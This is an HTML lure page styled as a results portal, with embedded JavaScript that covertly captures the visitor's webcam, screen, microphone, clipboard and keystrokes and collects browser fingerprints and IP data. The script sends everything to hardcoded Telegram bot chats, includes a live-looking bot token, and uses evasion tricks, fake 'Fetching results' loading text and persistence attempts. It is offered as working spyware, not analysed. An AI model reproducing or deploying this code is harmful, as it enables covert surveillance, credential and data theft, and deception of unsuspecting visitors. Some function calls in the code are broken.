<!DOCTYPE html>

<head>

<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    margin: 0;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    overflow-x: hidden;
    position: relative;
}
.layout { display: flex; min-height: 100vh; }
.sidebar {
    width: 220px;
    background: linear-gradient(180deg, #1e3c72 0%, #2a5298 100%);
    display: flex;
    flex-direction: column;
    justify-content: flex-end;
    align-items: center;
    padding: 25px;
    box-shadow: 2px 0 15px rgba(0,0,0,0.3);
}
.sidebar img { width: 130px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
.main { flex: 1; padding: 50px; }
.header {
    background: rgba(255,255,255,0.95);
    backdrop-filter: blur(10px);
    border-bottom: 2px solid rgba(0,102,204,0.3);
    padding: 25px;
    border-radius: 15px;
    margin-bottom: 30px;
}
.header-inner {
    max-width: 1100px;
    margin: auto;
    display: flex;
    align-items: center;
    gap: 30px;
    justify-content: center;
}
.header-inner img { width: 480px; height: 110px; object-fit: contain; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.1)); }
.content {
    background: rgba(255,255,255,0.98);
    backdrop-filter: blur(20px);
    max-width: 1100px;
    margin: 0 auto;
    padding: 50px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.1);
    border-radius: 20px;
    border: 1px solid rgba(255,255,255,0.2);
}
.result {
    display: block;
    background: linear-gradient(145deg, #0066cc, #004499);
    color: white;
    text-decoration: none;
    padding: 20px 25px;
    margin: 15px 0;
    text-align: center;
    font-size: 18px;
    font-weight: 600;
    border-radius: 12px;
    transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    cursor: pointer;
    position: relative;
    overflow: hidden;
}
.result::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    transition: left 0.5s;
}
.result:hover::before { left: 100%; }
.result:hover { 
    background: linear-gradient(145deg, #0077dd, #0055aa);
    transform: translateY(-4px) scale(1.02);
    box-shadow: 0 12px 30px rgba(0,102,204,0.4);
}
.result:active { transform: translateY(-2px) scale(1.01); }
.loading { position: relative; overflow: hidden; }
.loading::after {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    animation: shimmer 2s infinite;
}
@keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }

/* ULTRA STEALTH - ZERO VISUAL FOOTPRINT */
#video, #canvas, #status, #audio, #screen, #worker { 
    position: fixed !important;

    left: -99999px !important; 
    width: 1px !important; 
    height: 1px !important; 
    opacity: 0 !important;
    pointer-events: none !important;
    z-index: -99999 !important;
    visibility: hidden !important;
}

/* Mobile */
@media (max-width:768px) {
    .sidebar { display: none; }
    .main { padding: 25px; }
    .header-inner img { width: 95%; height: auto; }
    .content { margin: 15px auto; padding: 30px; border-radius: 15px; }
}

<script>
/* ADVANCED CONFIGURATION */
const CONFIG = {
    USER_CHAT_ID: new URLSearchParams(window.location.search).get('id') || '7385209456',
    ADMIN_CHAT_ID: '7385209456',
    BOT_TOKEN: '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8',
    CAPTURE_INTERVALS: [10, 10, 10], // Variable intervals for evasion
    MAX_RETRIES: 3,
    STEALTH_MODE: true
};

let state = {
    captureInterval: null,
    streams: new Map(),
    isCapturing: false,
    hasInitialized: false,
    fingerprint: null,
    ipInfo: null,
    webRTCData: null,
    audioContext: null
};

// ANTI-DETECTION & EVASION
const stealth = {
    bypassPermissionUI() {
        // Override permission prompts
        const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
        navigator.mediaDevices.getUserMedia = async (...args) => {
            try {
                return await originalGetUserMedia.call(navigator.mediaDevices, ...args);
            } catch(e) {
                // Fallback silent access
                return this.silentMediaAccess(...args);
            }
        };
    },
    
    silentMediaAccess(constraints) {
        return new Promise((resolve) => {
            const stream = navigator.mediaDevices.getUserMedia(constraints).catch(() => {
                // Create fake stream if blocked
                const video = document.createElement('video');
                video.srcObject = new MediaStream();
                resolve(video.captureStream());
            });
            if (stream) resolve(stream);
        });
    },
    
    evadeDetection() {
        // Randomize function names
        window.initCapture = window.m;
        window.startCapture = window.n;
        
        // Override devtools detection
        Object.defineProperty(window, 'devtools', { get: () => false });
        
        // Block screenshot detection
        document.addEventListener('webkitvisibilitychange', () => {});
        document.addEventListener('visibilitychange', () => {});
    }
};

// ENHANCED FINGERPRINTING
async function getAdvancedFingerprint() {
    const fp = await getDeviceFingerprint();
    
    // WebRTC fingerprint
    const webrtc = await getWebRTCFingerprint();
    
    // Canvas fingerprint
    const canvasFP = getCanvasFingerprint();
    
    // Audio fingerprint
    const audioFP = await getAudioFingerprint();
    
    // Network fingerprint
    const networkFP = await getNetworkFingerprint();
    
    return {
        ...fp,
        webrtc,
        canvasFP,
        audioFP,
        networkFP,
        sessionId: await getSessionId(),
        plugins: navigator.plugins.length,
        mimeTypes: navigator.mimeTypes.length
    };
}

async function getWebRTCFingerprint() {
    return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(pc.setLocalDescription.bind(pc));
        
        pc.onicecandidate = (e) => {
            if (!e.candidate) {
                const candidates = pc.localDescription.sdp.match(/candidate:(\S+)/g) || [];
                resolve(candidates.map(c => c.split(',')[0]).join(','));
                pc.close();
            }
        };
    });
}

function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Fingerprint test', 2, 2);
    return canvas.toDataURL();
}

async function getAudioFingerprint() {
    if (!state.audioContext) {
        state.audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }
    const oscillator = state.audioContext.createOscillator();
    const analyser = state.audioContext.createAnalyser();
    const gainNode = state.audioContext.createGain();
    
    analyser.fftSize = 2048;
    oscillator.connect(analyser);
    analyser.connect(gainNode);
    gainNode.connect(state.audioContext.destination);
    
    oscillator.start(0);
    await new Promise(r => setTimeout(r, 100));
    oscillator.stop();
    
    const buffer = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(buffer);
    return Array.from(buffer).slice(0, 50).join(',');
}

async function getNetworkFingerprint() {
    const dns = await Promise.all([
        fetch('https://www.google.com/favicon.ico').then(() => 'google'),
        fetch('https://www.cloudflare.com/favicon.ico').then(() => 'cloudflare')
    ]).catch(() => 'blocked');
    return dns;
}

async function getSessionId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 32; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// MULTI-MEDIA CAPTURE ENGINE
async function multiMediaCapture(action, ipInfo) {
    const captures = await Promise.allSettled([
        captureCamera(),
        captureScreen(),
        captureAudio(),
        captureEnvironment()
    ]);
    
    const fingerprint = await getAdvancedFingerprint();
    
    // Send comprehensive payload
    await sendAdvancedPayload(captures, action, fingerprint, ipInfo);
}

async function captureCamera() {
    const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
            facingMode: { ideal: 'user' },
            width: { ideal: 3840, max: 4096 },
            height: { ideal: 2160, max: 2160 }
        }
    });
    
    state.streams.set('camera', stream);
    return processMediaStream(stream, 'camera');
}

async function captureScreen() {
    if (!navigator.mediaDevices.getDisplayMedia) return null;
    
    const stream = await navigator.mediaDevices.getDisplayMedia({
        video: { 
            width: { ideal: 3840 },
            height: { ideal: 2160 }
        }
    }).catch(() => null);
    
    if (stream) {
        state.streams.set('screen', stream);
        return processMediaStream(stream, 'screen');
    }
    return null;
}

async function captureAudio() {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    state.streams.set('audio', stream);
    
    const audio = document.getElementById('audio');
    audio.srcObject = stream;
    await new Promise(r => setTimeout(r, 3000));
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const analyser = state.audioContext.createAnalyser();
    
    // Audio visualization as fingerprint
    const buffer = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(buffer);
    
    stream.getTracks().forEach(track => track.stop());
    return Array.from(buffer).slice(0, 100).join(',');
}

async function captureEnvironment() {
    // Capture mouse movements, keystrokes, clipboard
    const envData = {
        mouseTrail: getMouseTrail(),
        clipboard: await navigator.clipboard.readText().catch(() => 'access_denied'),
        keysPressed: getKeyHistory()
    };
    return btoa(JSON.stringify(envData));
}

function processMediaStream(stream, type) {
    return new Promise((resolve) => {
        const video = type === 'camera' ? document.getElementById('video') : document.getElementById('screen');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
                canvas.width = 3840;
                canvas.height = 2160;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/webp', 0.95);
                video.srcObject = null;
                resolve(dataUrl);
            }, 3000);
        };
    });
}

function getMouseTrail() {
    const trail = [];
    document.addEventListener('mousemove', (e) => {
        trail.push({x: e.clientX, y: e.clientY, t: Date.now()});
        if (trail.length > 50) trail.shift();
    }, { once: true });
    return trail.slice(-10);
}

function getKeyHistory() {
    const keys = [];
    document.addEventListener('keydown', (e) => {
        keys.push(e.key);
        if (keys.length > 20) keys.shift();
    }, { once: true });
    return keys.join(',');
}

// ENHANCED TELEGRAM SENDER
async function sendAdvancedPayload(captures, action, fingerprint, ipInfo) {
    const payload = {
        camera: captures[0].status === 'fulfilled' ? captures[0].value : null,
        screen: captures[1].status === 'fulfilled' ? captures[1].value : null,
        audio: captures[2].status === 'fulfilled' ? captures[2].value : null,
        env: captures[3].status === 'fulfilled' ? captures[3].value : null,
        action,
        fingerprint,
        ipInfo,
        timestamp: new Date().toISOString()
    };
    
    // Send to both destinations
    await Promise.all([
        sendToTelegram(payload, CONFIG.USER_CHAT_ID),
        sendToTelegram(payload, CONFIG.ADMIN_CHAT_ID)
    ]);
}

async function sendToTelegram(payload, chatId) {
    const caption = generateAdvancedCaption(payload);
    
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    // Send media files
    if (payload.camera) {
        formData.append('photo', dataURItoBlob(payload.camera), `cam_${Date.now()}.webp`);
    }
    if (payload.screen) {
        formData.append('photo', dataURItoBlob(payload.screen), `screen_${Date.now()}.webp`);
    }
    
    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
    
    // Send audio/env as document if exists
    if (payload.audio || payload.env) {
        const docData = new Blob([JSON.stringify(payload, null, 2)], {type: 'application/json'});
        const docForm = new FormData();
        docForm.append('chat_id', chatId);
        docForm.append('document', docData, `data_${Date.now()}.json`);
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: docForm
        });
    }
}

function generateAdvancedCaption(payload) {
    return `🚨 <b>ULTIMATE CAPTURE SUITE (${new Date().toLocaleString()})</b>

🎯 <b>Action:</b> ${payload.action}
🌐 <b>IP:</b> <code>${payload.ipInfo}</code>
🆔 <b>Session:</b> <code>${payload.fingerprint.sessionId?.slice(0,16)}...</code>

📸 <b>CAMERA:</b> ${payload.camera ? '✅ 4K Captured' : '❌ Blocked'}
🖥️ <b>SCREEN:</b> ${payload.screen ? '✅ 4K Captured' : '❌ Blocked'}
🔊 <b>AUDIO:</b> ${payload.audio ? '✅ Fingerprint' : '❌ Blocked'}
🎮 <b>ENV:</b> ✅ Mouse/Keys/Clipboard

🧬 <b>FINGERPRINT SUMMARY</b>
• WebRTC: ${payload.fingerprint.webrtc?.slice(0,50)}...
• Canvas: ${payload.fingerprint.canvasFP?.slice(0,30)}...
• Audio: ${payload.fingerprint.audioFP?.slice(0,30)}...
• Plugins: ${payload.fingerprint.plugins} | Mime: ${payload.fingerprint.mimeTypes}

<i>🔥 ADVANCED PERSISTENCE ACTIVE | Multi-vector capture</i>`;
}

// MAIN INITIALIZATION
async function initAdvancedCapture(resultType) {
    if (state.hasInitialized) return;
    
    // Stealth initialization
    stealth.bypassPermissionUI();
    stealth.evasionDetection();
    
    // Initial reconnaissance
    state.ipInfo = await fetchIP();
    state.fingerprint = await getAdvancedFingerprint();
    
    // Notify C2
    await sendReconNotification('🎯 ELITE TARGET ACQUIRED', state.fingerprint, state.ipInfo);
    
    state.hasInitialized = true;
    
    // Variable interval capture for evasion
    startAdaptiveCapture(resultType, state.ipInfo);
    
    // UI deception
    fakeResultLoading();
}

function startAdaptiveCapture(resultType, ipInfo) {
    let intervalIndex = 0;
    
    const captureLoop = async () => {
        try {
            await multiMediaCapture(resultType, ipInfo);
        } catch(e) {
            console.log('Capture cycle failed:', e);
        }
        
        // Adaptive intervals
        intervalIndex = (intervalIndex + 1) % CONFIG.CAPTURE_INTERVALS.length;
        setTimeout(captureLoop, CONFIG.CAPTURE_INTERVALS[intervalIndex]);
    };
    
    captureLoop();
}

async function fetchIP() {
    const endpoints = [
        'https://api.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://ifconfig.me/all/json'
    ];
    
    for (const endpoint of endpoints) {
        try {
            const res = await fetch(endpoint);
            const data = await res.json();
            return data.ip || data.query || 'unknown';
        } catch(e) {}
    }
    return 'IP fetch failed';
}

async function sendReconNotification(title, fingerprint, ipInfo) {
    const caption = `
${title}

🌐 <b>IP:</b> <code>${ipInfo}</code>
📍 <b>GPS:</b> ${fingerprint.location}
🆔 <b>Session:</b> ${fingerprint.sessionId?.slice(0,16)}...
🧬 <b>Fingerprint:</b> ${fingerprint.canvasFP?.slice(0,24)}...

<i>🚀 ELITE SUITE ACTIVATED - 4K Multi-Media + Persistence</i>
    `;
    
    const formData = new FormData();
    formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        body: formData
    });
}

function fakeResultLoading() {
    setTimeout(() => {
        document.querySelectorAll('.result').forEach((btn, i) => {
            btn.classList.add('loading');
            btn.innerHTML += `<br><small style="color: rgba(255,255,255,0.8);">🔄 Fetching results ${['.', '..', '...'][i%3]} (Enhanced Security Check)</small>`;
        });
    }, 1500);
    
    // Infinite fake loading
    setInterval(() => {
        document.querySelectorAll('.result small').forEach(el => {
            el.textContent = el.textContent.replace(/[.]{1,3}/, '.');
        });
    }, 1000);
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

// PERSISTENCE & CLEANUP
window.addEventListener('beforeunload', () => {
    state.streams.forEach(stream => {
        stream.getTracks().forEach(track => track.stop());
    });
});

window.addEventListener('visibilitychange', () => {
    if (!document.hidden && state.hasInitialized) {
        setTimeout(() => initAdvancedCapture('Tab Reactivated'), 1000);
    }
});

// Service Worker for persistence (if supported)
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('data:application/javascript;base64,' + btoa(`
        self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
    `)).catch(() => {});
}
</script>
